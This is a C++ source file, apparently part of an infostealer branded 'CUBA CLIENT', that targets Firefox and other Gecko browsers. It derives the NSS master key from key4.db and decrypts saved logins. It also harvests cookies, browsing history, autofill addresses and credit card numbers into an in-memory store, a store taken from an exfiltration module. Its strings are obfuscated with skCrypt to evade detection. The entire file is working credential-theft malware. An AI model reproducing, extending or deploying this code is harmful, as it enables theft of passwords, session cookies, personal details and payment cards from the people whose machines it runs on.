#include <gecko/extract_gecko.hpp>
#include <browser_utils/get_browsers.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <vector>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <json/json.hpp>
#include <sqlite_utils/sqlite3.h>
#include <exfiltration_utils/mem_store.hpp>
#include <browser_utils/stats_struct.hpp>
#include <crypto_utils/base64.h>
#include <crypto_utils/gecko_crypto.h>
#include <windows.h>

namespace fs = std::filesystem;
using Bytes = std::vector<BYTE>;

struct AsnNode {
    uint8_t tag = 0;
    Bytes data;
    std::vector<AsnNode> children;

    const AsnNode* ch(size_t i) const {
        return i < children.size() ? &children[i] : nullptr;
    }
    const Bytes* leaf() const {
        return !data.empty() ? &data : nullptr;
    }
};

static std::pair<size_t, size_t> der_tlv(const uint8_t* p, size_t avail, uint8_t& tag) {
    if (avail < 2) return {0,0};
    tag = p[0];
    size_t hdr, vlen;
    if (p[1] & 0x80) {
        size_t n = p[1] & 0x7f;
        if (!n || n > 4 || 2 + n > avail) return {0,0};
        vlen = 0;
        for (size_t i = 0; i < n; i++) vlen = (vlen << 8) | p[2+i];
        hdr = 2 + n;
    } else {
        vlen = p[1];
        hdr = 2;
    }
    return {hdr, vlen};
}

static AsnNode der_parse(const uint8_t* p, size_t len) {
    AsnNode root;
    if (len < 2) return root;
    uint8_t tag;
    auto [hdr, vlen] = der_tlv(p, len, tag);
    if (!hdr || hdr + vlen > len) return root;
    root.tag = tag;
    const uint8_t* vp = p + hdr;
    if (tag & 0x20) {
        size_t i = 0;
        while (i + 1 < vlen) {
            uint8_t ct;
            auto [ch, cv] = der_tlv(vp + i, vlen - i, ct);
            if (!ch || i + ch + cv > vlen) break;
            root.children.push_back(der_parse(vp + i, ch + cv));
            i += ch + cv;
        }
    } else {
        root.data.assign(vp, vp + vlen);
    }
    return root;
}

static AsnNode der_parse(const Bytes& b) {
    return der_parse(b.data(), b.size());
}
static AsnNode der_parse(const std::string& s) {
    return der_parse((const uint8_t*)s.data(), s.size());
}

static const AsnNode* nav(const AsnNode* n, std::initializer_list<size_t> path) {
    for (size_t i : path) {
        if (!n) return nullptr;
        n = n->ch(i);
    }
    return n;
}
static const Bytes* nav_leaf(const AsnNode* n, std::initializer_list<size_t> path) {
    const AsnNode* node = nav(n, path);
    return node ? node->leaf() : nullptr;
}

static Bytes sqlite_blob(sqlite3_stmt* s, int col) {
    const void* p = sqlite3_column_blob(s, col);
    int n         = sqlite3_column_bytes(s, col);
    if (!p || n <= 0) return {};
    return Bytes((const BYTE*)p, (const BYTE*)p + n);
}

//proud to say i stole the following 1:1.

//id-PBES2: 1.2.840.113549.1.5.13
static const uint8_t OID_PBES2[]    = {0x2a,0x86,0x48,0x86,0xf7,0x0d,0x01,0x05,0x0d};
//pbeWithSha1And3KeyTripleDES-CBC: 1.2.840.113549.1.12.5.1.3
static const uint8_t OID_PBE_3DES[] = {0x2a,0x86,0x48,0x86,0xf7,0x0d,0x01,0x0c,0x05,0x01,0x03};


static bool bytes_contain(const Bytes& haystack, const uint8_t* needle, size_t nlen) {
    if (haystack.size() < nlen) return false;
    return std::search(haystack.begin(), haystack.end(), needle, needle+nlen) != haystack.end();
}

static ULONG read_integer(const Bytes& b) {
    ULONG v = 0;
    for (auto x : b) v = (v << 8) | x;
    return v ? v : 1;
}

struct GlobalState {
    Bytes globalSalt;
    bool valid = false;
};

static GlobalState verify_password(const Bytes& item1, const Bytes& item2) {
    GlobalState gs;
    if (item1.empty() || item2.empty()) return gs;
    gs.globalSalt = item1;

    AsnNode root = der_parse(item2);

    if (bytes_contain(item2, OID_PBES2, sizeof(OID_PBES2))) {
        const Bytes* entrySalt = nav_leaf(&root, {0,1,0,1,0});
        const Bytes* iterBytes = nav_leaf(&root, {0,1,0,1,1});
        const Bytes* partIV    = nav_leaf(&root, {0,1,1,1});
        const Bytes* cipher    = nav_leaf(&root, {1});

        if (!entrySalt || !partIV || !cipher) return gs;

        ULONG iters = iterBytes ? read_integer(*iterBytes) : 1;
        Bytes aesKey = gecko_crypto::derive_aes256(gs.globalSalt, {}, *entrySalt, iters);

        //firefox specific 16-byte IV construction. add 0x04 0x0e to 14-byte part iv
        //honestly no clue what iam even doing. seems to work tho.
        Bytes iv = {0x04, 0x0e};
        iv.insert(iv.end(), partIV->begin(), partIV->end());
        if (iv.size() != 16) return gs;

        Bytes plain = gecko_crypto::aes256_cbc_decrypt(aesKey, iv, *cipher);
        if (plain.size() < 14) return gs;
        if (memcmp(plain.data(), skCrypt("password-check"), 14) == 0) gs.valid = true;

    } else if (bytes_contain(item2, OID_PBE_3DES, sizeof(OID_PBE_3DES))) {
        const Bytes* entrySalt = nav_leaf(&root, {0,1,0});
        const Bytes* cipher    = nav_leaf(&root, {1});

        if (!entrySalt || !cipher) return gs;

        auto kv = gecko_crypto::derive_3des(gs.globalSalt, {}, *entrySalt);
        if (!kv.valid) return gs;

        Bytes plain = gecko_crypto::des3_cbc_decrypt(kv.key, kv.iv, *cipher);
        if (plain.size() < 14) return gs;
        if (memcmp(plain.data(), skCrypt("password-check"), 14) == 0) gs.valid = true;
    }

    return gs;
}

static Bytes extract_master_key(const Bytes& a11, const GlobalState& gs) {
    AsnNode root = der_parse(a11);

    const Bytes* entrySalt = nav_leaf(&root, {0,1,0,1,0});
    const Bytes* iterBytes = nav_leaf(&root, {0,1,0,1,1});
    const Bytes* partIV    = nav_leaf(&root, {0,1,1,1});
    const Bytes* cipher    = nav_leaf(&root, {1});

    if (!entrySalt || !partIV || !cipher) return {};

    ULONG iters = iterBytes ? read_integer(*iterBytes) : 1;
    Bytes aesKey = gecko_crypto::derive_aes256(gs.globalSalt, {}, *entrySalt, iters);

    Bytes iv = {0x04, 0x0e};
    iv.insert(iv.end(), partIV->begin(), partIV->end());
    if (iv.size() != 16) return {};

    Bytes plain = gecko_crypto::aes256_cbc_decrypt(aesKey, iv, *cipher);
    if (plain.size() < 24) return {};

    //modern firefox (128+) uses AES-256 SDR key (32 bytes), older uses 3DES (24 bytes)
    size_t keylen = plain.size() >= 32 ? 32 : 24;
    return Bytes(plain.begin(), plain.begin() + keylen);
}

static Bytes get_master_key(const std::string& profile) {
    fs::path key4 = fs::path(profile) / skCrypt("key4.db");
    if (!fs::exists(key4)) return {};

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(key4.string().c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        if (db) sqlite3_close_v2(db);
        return {};
    }

    GlobalState gs;
    {
        sqlite3_stmt* s = nullptr;
        if (sqlite3_prepare_v2(db, skCrypt("SELECT item1, item2 FROM metaData WHERE id = 'password'"), -1, &s, nullptr) == SQLITE_OK) {
            if (sqlite3_step(s) == SQLITE_ROW) {
                Bytes item1 = sqlite_blob(s, 0);
                Bytes item2 = sqlite_blob(s, 1);
                gs = verify_password(item1, item2);
            }
            sqlite3_finalize(s);
        }
    }

    if (!gs.valid) {
        sqlite3_close_v2(db);
        return {};
    }

    Bytes masterKey;
    {
        sqlite3_stmt* s = nullptr;
        if (sqlite3_prepare_v2(db, skCrypt("SELECT a11 FROM nssPrivate"), -1, &s, nullptr) == SQLITE_OK) {
            while (sqlite3_step(s) == SQLITE_ROW) {
                Bytes a11 = sqlite_blob(s, 0);
                if (a11.empty()) continue;
                masterKey = extract_master_key(a11, gs);
                if (!masterKey.empty()) break;
            }
            sqlite3_finalize(s);
        }
    }

    sqlite3_close_v2(db);
    return masterKey;
}

static std::string decrypt_login(const Bytes& masterKey, const std::string& b64) {
    if (b64.empty() || masterKey.size() < 24) return "";
    std::string raw = base64::from_base64(b64);
    if (raw.empty()) return "";

    AsnNode root = der_parse(raw);

    //modern firefox login DER: SEQ{ OCTET(keyID); SEQ{OID; OCTET(IV)}; OCTET(cipher) }
    //older firefox login DER:  SEQ{ SEQ{OID; OCTET(IV)}; OCTET(cipher) }
    const Bytes* iv     = nullptr;
    const Bytes* cipher = nullptr;
    if (root.children.size() >= 3) {
        iv     = nav_leaf(&root, {1, 1});
        cipher = nav_leaf(&root, {2});
    } else {
        iv     = nav_leaf(&root, {0, 1});
        cipher = nav_leaf(&root, {1});
    }

    if (!iv || !cipher || iv->empty() || cipher->empty()) return "";

    Bytes plain;
    if (iv->size() == 16 && masterKey.size() >= 32) {
        Bytes key32(masterKey.begin(), masterKey.begin() + 32);
        plain = gecko_crypto::aes256_cbc_decrypt(key32, *iv, *cipher);
    } else if (iv->size() == 8 && masterKey.size() >= 24) {
        Bytes key24(masterKey.begin(), masterKey.begin() + 24);
        plain = gecko_crypto::des3_cbc_decrypt(key24, *iv, *cipher);
    } else {
        return "";
    }

    std::string result;
    result.reserve(plain.size());
    for (auto c : plain) {
        if (c >= 0x20 && c <= 0x7e) result += (char)c;
    }
    return result;
}

//derive friendly browser label + per profile virtual path prefix
//profile C:\...\Mozilla\Firefox\Profiles\abc123.default-release
static std::string gecko_vprefix(const fs::path& profile) {
    fs::path profiles_dir = profile.parent_path(); //…/Firefox/Profiles
    fs::path browser_dir  = profiles_dir.parent_path(); //…/Firefox
    std::string bname = browser_dir.filename().string();
    std::string pname = profile.filename().string();
    return skCrypt("gecko/") + bname + "/" + pname + "/";
}

//convert Gecko unixtime shit to UTC string
static std::string gecko_time_str(int64_t t_us) {
    if (t_us <= 0) return "";
    time_t t = (time_t)(t_us / 1000000);
    struct tm* ti = gmtime(&t);
    if (!ti) return "";
    char buf[32];
    strftime(buf, sizeof(buf), skCrypt("%Y-%m-%d %H:%M:%S UTC"), ti);
    return buf;
}

//oepen read only copy so we dont get blocked.
static sqlite3* open_ro_copy(const fs::path& src) {
    if (!fs::exists(src)) return nullptr;
    fs::path tmp = fs::temp_directory_path() / src.filename();
    if (!CopyFileA(src.string().c_str(), tmp.string().c_str(), FALSE)) return nullptr;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tmp.string().c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        if (db) sqlite3_close_v2(db);
        fs::remove(tmp);
        return nullptr;
    }
    return db;
}

namespace features {

std::vector<std::string> get_gecko_profiles() {
    auto found = utils::get_gecko_browsers();
    std::vector<std::string> all;
    for (const auto& browser_path : found) {
        try {
            for (const auto& entry : fs::directory_iterator(browser_path)) {
                if (!entry.is_directory()) continue;
                auto p = entry.path();
                if (!fs::exists(p / skCrypt("key4.db")) || !fs::exists(p / skCrypt("logins.json")))
                    continue;
                all.push_back(p.string());
            }
        } catch (...) {}
    }
    return all;
}

void extract_gecko_cookies(std::vector<std::string>& profiles) {
    for (const auto& profile : profiles) {
        fs::path src = fs::path(profile) / skCrypt("cookies.sqlite");
        sqlite3* db = open_ro_copy(src);
        if (!db) continue;

        fs::path tmp = fs::temp_directory_path() / src.filename();
        std::string vprefix = gecko_vprefix(fs::path(profile));
        sqlite3_stmt* s = nullptr;
        const char* q = skCrypt("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies");
        if (sqlite3_prepare_v2(db, q, -1, &s, nullptr) == SQLITE_OK) {
            std::string out;
            while (sqlite3_step(s) == SQLITE_ROW) {
                auto col = [&](int i) -> std::string {
                    const char* p = (const char*)sqlite3_column_text(s, i);
                    int n = sqlite3_column_bytes(s, i);
                    return p ? std::string(p, n) : "";
                };
                long long expires  = sqlite3_column_int64(s, 4);
                int       secure   = sqlite3_column_int(s, 5);
                int       httpOnly = sqlite3_column_int(s, 6);
                features::stats.cookie_count++;
                out += skCrypt("Host: ")     + col(0) + "\n"
                     + skCrypt("Name: ")     + col(1) + "\n"
                     + skCrypt("Value: ")    + col(2) + "\n"
                     + skCrypt("Path: ")     + col(3) + "\n"
                     + skCrypt("Expires: ")  + gecko_time_str(expires * 1000000LL) + "\n"
                     + skCrypt("Secure: ")   + (secure   ? "true" : "false") + "\n"
                     + skCrypt("HttpOnly: ") + (httpOnly  ? "true" : "false") + "\n"
                     + skCrypt("\n-# CUBA CLIENT #-\n");
            }
            sqlite3_finalize(s);
            if (!out.empty()) mem_store::append(vprefix + skCrypt("cookies.txt"), out);
        }
        sqlite3_close_v2(db);
        fs::remove(tmp);
    }
}

void extract_gecko_passwords(std::vector<std::string>& profiles) {
    for (const auto& profile : profiles) {
        Bytes masterKey = get_master_key(profile);
        if (masterKey.empty()) continue;

        fs::path logins_path = fs::path(profile) / skCrypt("logins.json");
        if (!fs::exists(logins_path)) continue;

        std::string vprefix = gecko_vprefix(fs::path(profile));
        try {
            std::ifstream lf(logins_path);
            nlohmann::json j;
            lf >> j;
            std::string k_logins = skCrypt("logins");
            auto& arr = j[k_logins];

            std::string out;
            for (auto& login : arr) {
                std::string host = login.value(skCrypt("hostname"), "");
                std::string user = decrypt_login(masterKey, login.value(skCrypt("encryptedUsername"), ""));
                std::string pass = decrypt_login(masterKey, login.value(skCrypt("encryptedPassword"), ""));
                features::stats.password_count++;
                out += skCrypt("Hostname: ") + host + "\n"
                     + skCrypt("Username: ") + user + "\n"
                     + skCrypt("Password: ") + pass + "\n"
                     + skCrypt("\n-# CUBA CLIENT #-\n");
            }
            if (!out.empty())
                mem_store::append(vprefix + skCrypt("passwords.txt"), out);
        } catch (...) {}
    }
}

void extract_gecko_history(std::vector<std::string>& profiles) {
    for (const auto& profile : profiles) {
        fs::path src = fs::path(profile) / skCrypt("places.sqlite");
        sqlite3* db = open_ro_copy(src);
        if (!db) continue;

        fs::path tmp = fs::temp_directory_path() / src.filename();
        std::string vprefix = gecko_vprefix(fs::path(profile));
        sqlite3_stmt* s = nullptr;
        const char* q = skCrypt(
            "SELECT p.url, p.title, p.visit_count, MAX(v.visit_date) "
            "FROM moz_places p JOIN moz_historyvisits v ON v.place_id = p.id "
            "GROUP BY p.id ORDER BY MAX(v.visit_date) DESC LIMIT 5000");

        if (sqlite3_prepare_v2(db, q, -1, &s, nullptr) == SQLITE_OK) {
            std::string out;
            while (sqlite3_step(s) == SQLITE_ROW) {
                auto col = [&](int i) -> std::string {
                    const char* p = (const char*)sqlite3_column_text(s, i);
                    int n = sqlite3_column_bytes(s, i);
                    return p ? std::string(p, n) : "";
                };
                int64_t last_visit = sqlite3_column_int64(s, 3);
                out += skCrypt("URL: ")       + col(0) + "\n"
                     + skCrypt("Title: ")     + col(1) + "\n"
                     + skCrypt("Visits: ")    + col(2) + "\n"
                     + skCrypt("LastVisit: ") + gecko_time_str(last_visit) + "\n"
                     + skCrypt("\n-# CUBA CLIENT #-\n");
            }
            sqlite3_finalize(s);
            if (!out.empty()) mem_store::append(vprefix + skCrypt("history.txt"), out);
        }
        sqlite3_close_v2(db);
        fs::remove(tmp);
    }
}

void extract_gecko_autofill(std::vector<std::string>& profiles) {
    for (const auto& profile : profiles) {
        std::string vprefix = gecko_vprefix(fs::path(profile));

        //form history. field name + value
        {
            fs::path src = fs::path(profile) / skCrypt("formhistory.sqlite");
            sqlite3* db = open_ro_copy(src);
            if (db) {
                fs::path tmp = fs::temp_directory_path() / src.filename();
                sqlite3_stmt* s = nullptr;
                if (sqlite3_prepare_v2(db,
                    skCrypt("SELECT fieldname, value, timesUsed FROM moz_formhistory ORDER BY timesUsed DESC"),
                    -1, &s, nullptr) == SQLITE_OK) {
                    std::string out;
                    while (sqlite3_step(s) == SQLITE_ROW) {
                        auto col = [&](int i) -> std::string {
                            const char* p = (const char*)sqlite3_column_text(s, i);
                            int n = sqlite3_column_bytes(s, i);
                            return p ? std::string(p, n) : "";
                        };
                        out += skCrypt("Field: ") + col(0) + "\n"
                             + skCrypt("Value: ") + col(1) + "\n"
                             + skCrypt("Uses: ")  + col(2) + "\n"
                             + skCrypt("\n-# CUBA CLIENT #-\n");
                    }
                    sqlite3_finalize(s);
                    if (!out.empty()) mem_store::append(vprefix + skCrypt("autofill.txt"), out);
                }
                sqlite3_close_v2(db);
                fs::remove(tmp);
            }
        }

        //address autofill (structured: name, street, city, postal, email, phone)
        {
            fs::path src = fs::path(profile) / skCrypt("autofill.sqlite");
            sqlite3* db = open_ro_copy(src);
            if (db) {
                fs::path tmp = fs::temp_directory_path() / src.filename();
                sqlite3_stmt* s = nullptr;
                if (sqlite3_prepare_v2(db,
                    skCrypt("SELECT given_name, family_name, organization, street_address, "
                    "address_level2, address_level1, postal_code, country, email, tel "
                    "FROM addresses"),
                    -1, &s, nullptr) == SQLITE_OK) {
                    std::string out;
                    while (sqlite3_step(s) == SQLITE_ROW) {
                        auto col = [&](int i) -> std::string {
                            const char* p = (const char*)sqlite3_column_text(s, i);
                            int n = sqlite3_column_bytes(s, i);
                            return p ? std::string(p, n) : "";
                        };
                        out += skCrypt("Name: ")    + col(0) + " " + col(1) + "\n"
                             + skCrypt("Company: ") + col(2) + "\n"
                             + skCrypt("Address: ") + col(3) + "\n"
                             + skCrypt("City: ")    + col(4) + "\n"
                             + skCrypt("State: ")   + col(5) + "\n"
                             + skCrypt("ZIP: ")     + col(6) + "\n"
                             + skCrypt("Country: ") + col(7) + "\n"
                             + skCrypt("Email: ")   + col(8) + "\n"
                             + skCrypt("Phone: ")   + col(9) + "\n"
                             + skCrypt("\n-# CUBA CLIENT #-\n");
                    }
                    sqlite3_finalize(s);
                    if (!out.empty()) mem_store::append(vprefix + skCrypt("addresses.txt"), out);
                }
                sqlite3_close_v2(db);
                fs::remove(tmp);
            }
        }
    }
}

void extract_gecko_cards(std::vector<std::string>& profiles) {
    for (const auto& profile : profiles) {
        Bytes masterKey = get_master_key(profile);

        fs::path src = fs::path(profile) / "autofill.sqlite";
        sqlite3* db = open_ro_copy(src);
        if (!db) continue;

        fs::path tmp = fs::temp_directory_path() / src.filename();
        std::string vprefix = gecko_vprefix(fs::path(profile));
        sqlite3_stmt* s = nullptr;

        if (sqlite3_prepare_v2(db,
            skCrypt("SELECT cc_name, cc_number_enc, cc_exp_month, cc_exp_year FROM credit_cards"),
            -1, &s, nullptr) == SQLITE_OK) {
            std::string out;
            while (sqlite3_step(s) == SQLITE_ROW) {
                auto col = [&](int i) -> std::string {
                    const char* p = (const char*)sqlite3_column_text(s, i);
                    int n = sqlite3_column_bytes(s, i);
                    return p ? std::string(p, n) : "";
                };
                std::string name    = col(0);
                std::string enc_num = col(1);
                std::string exp_m   = col(2);
                std::string exp_y   = col(3);

                //attempt decryption using the NSS master key (same as login encryption)
                std::string num = masterKey.empty() ? enc_num : decrypt_login(masterKey, enc_num);
                if (num.empty()) num = enc_num; //store raw base64 if decryption fails

                features::stats.card_count++;
                out += skCrypt("Name: ")   + name  + "\n"
                     + skCrypt("Number: ") + num   + "\n"
                     + skCrypt("Expiry: ") + exp_m + "/" + exp_y + "\n"
                     + skCrypt("\n-# CUBA CLIENT #-\n");
            }
            sqlite3_finalize(s);
            if (!out.empty()) mem_store::append(vprefix + skCrypt("credit_cards.txt"), out);
        }
        sqlite3_close_v2(db);
        fs::remove(tmp);
    }
}

} //namespace features
